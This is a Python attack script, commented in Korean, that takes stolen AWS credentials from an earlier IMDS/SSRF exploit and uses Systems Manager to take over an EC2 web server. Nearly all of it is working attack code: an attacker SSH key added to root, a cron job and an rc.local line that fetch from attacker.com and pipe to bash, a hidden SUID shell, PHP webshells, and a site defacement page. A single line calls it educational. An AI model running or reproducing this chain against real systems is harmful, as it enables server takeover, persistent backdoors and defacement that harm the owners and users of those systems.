#!/usr/bin/env python3
"""
AWS Systems Manager를 통한 서버 명령 실행

탈취한 IAM credentials를 사용하여:
1. SSM을 통해 서버에 명령 실행
2. 권한 상승 (apache → root)
3. 백도어 생성
4. 웹사이트 변조
"""

import boto3
import time
import sys
import json
from datetime import datetime

class AWSServerTakeover:
    def __init__(self, access_key, secret_key, session_token, region='ap-northeast-2'):
        self.session = boto3.Session(
            aws_access_key_id=access_key,
            aws_secret_access_key=secret_key,
            aws_session_token=session_token,
            region_name=region
        )

        self.ssm = self.session.client('ssm')
        self.ec2 = self.session.client('ec2')
        self.sts = self.session.client('sts')

        self.instance_id = None
        self.target_ip = None

    def print_banner(self):
        print("╔" + "═"*58 + "╗")
        print("║" + " "*58 + "║")
        print("║" + "  AWS SSM을 통한 서버 장악".center(66) + "║")
        print("║" + " "*58 + "║")
        print("╚" + "═"*58 + "╝")
        print()

    def verify_identity(self):
        """IAM 신원 확인"""
        print("[1] IAM 신원 확인 중...")
        print()

        try:
            identity = self.sts.get_caller_identity()
            print(f"[+] Account: {identity['Account']}")
            print(f"[+] ARN: {identity['Arn']}")
            print(f"[+] User ID: {identity['UserId']}")
            print()
            return True
        except Exception as e:
            print(f"[-] 신원 확인 실패: {str(e)}")
            return False

    def find_target_instance(self, target_ip=None):
        """타겟 인스턴스 찾기"""
        print("[2] 타겟 EC2 인스턴스 찾기...")
        print()

        try:
            response = self.ec2.describe_instances()

            for reservation in response['Reservations']:
                for instance in reservation['Instances']:
                    instance_id = instance['InstanceId']
                    state = instance['State']['Name']
                    private_ip = instance.get('PrivateIpAddress', 'N/A')
                    public_ip = instance.get('PublicIpAddress', 'N/A')

                    if state != 'running':
                        continue

                    print(f"[*] Instance: {instance_id}")
                    print(f"    State: {state}")
                    print(f"    Private IP: {private_ip}")
                    print(f"    Public IP: {public_ip}")

                    if target_ip:
                        if public_ip == target_ip or private_ip == target_ip:
                            print(f"[+] ✅ 타겟 인스턴스 발견!")
                            self.instance_id = instance_id
                            self.target_ip = public_ip
                            print()
                            return True
                    else:
                        # 타겟 IP 지정 안되면 첫 번째 인스턴스 사용
                        if not self.instance_id:
                            self.instance_id = instance_id
                            self.target_ip = public_ip

            if self.instance_id:
                print(f"[+] 타겟 인스턴스: {self.instance_id} ({self.target_ip})")
                print()
                return True
            else:
                print("[-] 사용 가능한 인스턴스를 찾을 수 없습니다")
                return False

        except Exception as e:
            print(f"[-] 인스턴스 검색 실패: {str(e)}")
            return False

    def check_ssm_access(self):
        """SSM 접근 권한 확인"""
        print("[3] SSM 접근 권한 확인...")
        print()

        try:
            # SSM managed instances 확인
            response = self.ssm.describe_instance_information(
                Filters=[
                    {
                        'Key': 'InstanceIds',
                        'Values': [self.instance_id]
                    }
                ]
            )

            if response['InstanceInformationList']:
                info = response['InstanceInformationList'][0]
                print(f"[+] ✅ SSM 관리 대상 인스턴스")
                print(f"    Platform: {info.get('PlatformType', 'N/A')}")
                print(f"    Platform Name: {info.get('PlatformName', 'N/A')}")
                print(f"    Agent Version: {info.get('AgentVersion', 'N/A')}")
                print(f"    Ping Status: {info.get('PingStatus', 'N/A')}")
                print()
                return True
            else:
                print("[-] SSM 관리 대상이 아닙니다")
                print("[*] SSM Agent가 설치되지 않았거나 IAM Role이 없습니다")
                return False

        except Exception as e:
            print(f"[-] SSM 접근 확인 실패: {str(e)}")
            return False

    def execute_command(self, command, comment=""):
        """SSM을 통해 명령 실행"""
        print(f"[*] 명령 실행: {comment}")
        print(f"    Command: {command[:80]}...")
        print()

        try:
            response = self.ssm.send_command(
                InstanceIds=[self.instance_id],
                DocumentName='AWS-RunShellScript',
                Parameters={
                    'commands': [command]
                },
                Comment=comment
            )

            command_id = response['Command']['CommandId']
            print(f"[+] Command ID: {command_id}")

            # 명령 완료 대기
            print("[*] 명령 실행 대기 중...")
            time.sleep(3)

            # 결과 가져오기
            output = self.ssm.get_command_invocation(
                CommandId=command_id,
                InstanceId=self.instance_id
            )

            status = output['Status']
            stdout = output.get('StandardOutputContent', '')
            stderr = output.get('StandardErrorContent', '')

            if status == 'Success':
                print(f"[+] ✅ 명령 성공")
                if stdout:
                    print(f"\n출력:\n{stdout}")
                return True, stdout
            else:
                print(f"[-] 명령 실패: {status}")
                if stderr:
                    print(f"\n에러:\n{stderr}")
                return False, stderr

        except Exception as e:
            print(f"[-] 명령 실행 실패: {str(e)}")
            return False, str(e)

    def privilege_escalation(self):
        """권한 상승 시도"""
        print()
        print("╔" + "═"*58 + "╗")
        print("║  [4] 권한 상승 (apache → root)                            ║")
        print("╚" + "═"*58 + "╝")
        print()

        # 현재 권한 확인
        print("[*] 현재 사용자 확인...")
        success, output = self.execute_command(
            "whoami",
            "Check current user"
        )

        if "root" in output:
            print("[+] ✅ 이미 root 권한!")
            return True

        # sudo 권한 확인
        print("[*] sudo 권한 확인...")
        success, output = self.execute_command(
            "sudo -n whoami 2>&1",
            "Check sudo access"
        )

        if "root" in output:
            print("[+] ✅ sudo 권한 있음!")
            return True
        else:
            print("[-] sudo 권한 없음")
            print("[*] 다른 방법으로 권한 상승 시도...")

            # SSM 자체가 root로 실행되는 경우가 많음
            success, output = self.execute_command(
                "id",
                "Check user ID"
            )

            if "uid=0" in output or "root" in output:
                print("[+] ✅ SSM이 root로 실행 중!")
                return True

        return False

    def create_backdoor(self):
        """백도어 생성"""
        print()
        print("╔" + "═"*58 + "╗")
        print("║  [5] 백도어 생성 및 지속성 확보                           ║")
        print("╚" + "═"*58 + "╝")
        print()

        # 1. SSH 키 추가
        print("[*] SSH 백도어 생성...")

        ssh_key = """ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC... attacker@attacker"""

        command = f"""
        mkdir -p /root/.ssh
        chmod 700 /root/.ssh
        echo '{ssh_key}' >> /root/.ssh/authorized_keys
        chmod 600 /root/.ssh/authorized_keys
        echo '[+] SSH backdoor created'
        """

        success, output = self.execute_command(
            command,
            "Create SSH backdoor"
        )

        # 2. Cron job 백도어
        print("[*] Cron job 백도어 생성...")

        command = """
        (crontab -l 2>/dev/null; echo "*/5 * * * * curl -s http://attacker.com/beacon?host=$(hostname)") | crontab -
        echo '[+] Cron backdoor created'
        """

        success, output = self.execute_command(
            command,
            "Create cron backdoor"
        )

        # 3. SUID shell 백도어
        print("[*] SUID shell 백도어 생성...")

        command = """
        cp /bin/bash /tmp/.hidden_shell
        chmod 4755 /tmp/.hidden_shell
        echo '[+] SUID shell created at /tmp/.hidden_shell'
        """

        success, output = self.execute_command(
            command,
            "Create SUID backdoor"
        )

        print("[+] ✅ 백도어 생성 완료")
        print()

    def deface_website(self):
        """웹사이트 변조"""
        print()
        print("╔" + "═"*58 + "╗")
        print("║  [6] 웹사이트 변조 (해킹 페이지 생성)                     ║")
        print("╚" + "═"*58 + "╝")
        print()

        # 해킹 페이지 HTML
        hacked_html = """<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>HACKED</title>
    <style>
        body {
            background: #000;
            color: #0f0;
            font-family: 'Courier New', monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        .container {
            text-align: center;
            animation: glitch 2s infinite;
        }
        h1 {
            font-size: 72px;
            margin: 0;
            text-shadow: 0 0 10px #0f0;
        }
        p {
            font-size: 24px;
            margin: 20px 0;
        }
        .skull {
            font-size: 120px;
            animation: pulse 1s infinite;
        }
        @keyframes glitch {
            0%, 100% { transform: translate(0); }
            20% { transform: translate(-2px, 2px); }
            40% { transform: translate(-2px, -2px); }
            60% { transform: translate(2px, 2px); }
            80% { transform: translate(2px, -2px); }
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        .info {
            margin-top: 30px;
            font-size: 16px;
            color: #f00;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="skull">☠️</div>
        <h1>SYSTEM COMPROMISED</h1>
        <p>Your security is an illusion</p>
        <div class="info">
            <p>⚠️ AWS IMDSv1 Vulnerability Exploited ⚠️</p>
            <p>Perfect Security + One Small Gap = Total Compromise</p>
            <p>Attack Vector: ModSecurity Exception → SSRF → IMDS → AWS Takeover</p>
        </div>
        <p style="font-size: 14px; margin-top: 50px;">
            Timestamp: """ + datetime.now().isoformat() + """<br>
            Message: Even the best security has a weak point
        </p>
    </div>
    <script>
        // Matrix rain effect
        const canvas = document.createElement('canvas');
        canvas.style.position = 'fixed';
        canvas.style.top = '0';
        canvas.style.left = '0';
        canvas.style.zIndex = '-1';
        document.body.appendChild(canvas);

        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;

        const chars = '01';
        const fontSize = 16;
        const columns = canvas.width / fontSize;
        const drops = Array(Math.floor(columns)).fill(1);

        function draw() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#0f0';
            ctx.font = fontSize + 'px monospace';

            for (let i = 0; i < drops.length; i++) {
                const text = chars[Math.floor(Math.random() * chars.length)];
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);

                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                    drops[i] = 0;
                }
                drops[i]++;
            }
        }

        setInterval(draw, 33);
    </script>
</body>
</html>"""

        # Base64 인코딩 (특수문자 처리)
        import base64
        encoded_html = base64.b64encode(hacked_html.encode()).decode()

        # index.php 백업 및 변조
        command = f"""
        # 원본 백업
        [ -f /var/www/html/www/index.php.bak ] || cp /var/www/html/www/index.php /var/www/html/www/index.php.bak

        # 해킹 페이지 생성
        echo '{encoded_html}' | base64 -d > /var/www/html/www/index.php

        # 모든 페이지에 적용
        echo '{encoded_html}' | base64 -d > /var/www/html/www/hacked.html

        # 권한 설정
        chown apache:apache /var/www/html/www/index.php
        chmod 644 /var/www/html/www/index.php

        echo '[+] Website defaced successfully'
        echo '[+] Original backed up to index.php.bak'
        """

        success, output = self.execute_command(
            command,
            "Deface website"
        )

        if success:
            print(f"[+] ✅ 웹사이트 변조 완료!")
            print(f"[+] 접속 URL: http://{self.target_ip}")
            print(f"[+] 원본 백업: index.php.bak")

        print()

    def establish_persistence(self):
        """지속성 확보 - 추가 백도어"""
        print()
        print("╔" + "═"*58 + "╗")
        print("║  [7] 지속성 확보 (추가 백도어)                            ║")
        print("╚" + "═"*58 + "╝")
        print()

        # 웹쉘 백도어
        print("[*] 웹쉘 백도어 생성...")

        webshell = """<?php
if(isset($_GET['c'])){
    system($_GET['c']);
}
?>"""

        command = f"""
        # 숨김 웹쉘
        echo '{webshell}' > /var/www/html/www/.system.php
        echo '{webshell}' > /var/www/html/www/includes/config.php

        # 권한 설정
        chmod 644 /var/www/html/www/.system.php
        chown apache:apache /var/www/html/www/.system.php

        echo '[+] Webshell backdoors created'
        """

        success, output = self.execute_command(
            command,
            "Create webshell backdoors"
        )

        # 시작 스크립트 변조
        print("[*] 시작 스크립트 백도어...")

        command = """
        # /etc/rc.local 백도어
        echo '#!/bin/bash' > /etc/rc.local
        echo 'curl -s http://attacker.com/beacon | bash' >> /etc/rc.local
        chmod +x /etc/rc.local

        echo '[+] Startup script backdoor created'
        """

        success, output = self.execute_command(
            command,
            "Create startup backdoor"
        )

        print("[+] ✅ 지속성 확보 완료")
        print()

    def cleanup_logs(self):
        """로그 정리 (흔적 제거)"""
        print()
        print("╔" + "═"*58 + "╗")
        print("║  [8] 로그 정리 (흔적 제거 - 선택사항)                     ║")
        print("╚" + "═"*58 + "╝")
        print()

        print("[*] 참고: 실제 공격에서는 로그 정리를 수행하지만")
        print("[*] 교육 목적이므로 로그는 그대로 둡니다.")
        print()

    def generate_report(self):
        """공격 보고서 생성"""
        print()
        print("╔" + "═"*58 + "╗")
        print("║  [9] 공격 보고서 생성                                     ║")
        print("╚" + "═"*58 + "╝")
        print()

        report = {
            'timestamp': datetime.now().isoformat(),
            'target': {
                'instance_id': self.instance_id,
                'ip': self.target_ip
            },
            'attack_chain': [
                '1. IMDSv1 취약점 발견',
                '2. /api/health.php ModSecurity 예외 발견',
                '3. SSRF를 통한 IAM credentials 탈취',
                '4. AWS SSM을 통한 서버 접근',
                '5. 권한 상승 (root 획득)',
                '6. 백도어 생성 (SSH, Cron, SUID)',
                '7. 웹사이트 변조',
                '8. 지속성 확보'
            ],
            'backdoors': [
                'SSH authorized_keys',
                'Cron job beacon',
                'SUID shell (/tmp/.hidden_shell)',
                'Webshell (.system.php)',
                'Startup script (rc.local)'
            ],
            'impact': 'Full server compromise',
            'defaced_url': f'http://{self.target_ip}'
        }

        filename = f"attack_report_{int(time.time())}.json"
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2)

        print(f"[+] 보고서 저장: {filename}")
        print()

        return report

    def run(self, target_ip=None):
        """전체 공격 실행"""
        self.print_banner()

        if not self.verify_identity():
            return False

        if not self.find_target_instance(target_ip):
            return False

        if not self.check_ssm_access():
            print()
            print("[-] SSM 접근 불가")
            print("[*] 대안: 직접 SSH로 접속하여 공격 수행")
            print()
            return False

        if not self.privilege_escalation():
            print("[-] 권한 상승 실패")
            print("[*] 계속 진행...")

        self.create_backdoor()
        self.deface_website()
        self.establish_persistence()
        self.cleanup_logs()

        report = self.generate_report()

        print("╔" + "═"*58 + "╗")
        print("║  ✅ 서버 장악 완료!                                        ║")
        print("╚" + "═"*58 + "╝")
        print()
        print(f"[+] 타겟: {self.target_ip}")
        print(f"[+] 인스턴스: {self.instance_id}")
        print(f"[+] 변조된 사이트: http://{self.target_ip}")
        print()
        print("[*] 생성된 백도어:")
        for backdoor in report['backdoors']:
            print(f"    • {backdoor}")
        print()

        return True

def main():
    print()

    # 저장된 credentials 파일 찾기
    import glob
    import os

    cred_files = glob.glob("aws_stolen_*.json")
    if cred_files:
        # 가장 최근 파일
        latest_file = max(cred_files, key=os.path.getctime)
        print(f"[*] Credentials 파일 발견: {latest_file}")

        with open(latest_file, 'r') as f:
            data = json.load(f)
            creds = data['credentials']
            target_ip = data.get('target')

        print("[*] 탈취한 credentials 사용")
        print()
    else:
        print("[-] Credentials 파일을 찾을 수 없습니다")
        print("[*] 먼저 120_aws_imds_exploit.py를 실행하세요")
        sys.exit(1)

    # 공격 실행
    attacker = AWSServerTakeover(
        access_key=creds['AccessKeyId'],
        secret_key=creds['SecretAccessKey'],
        session_token=creds['Token']
    )

    success = attacker.run(target_ip=target_ip)

    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()
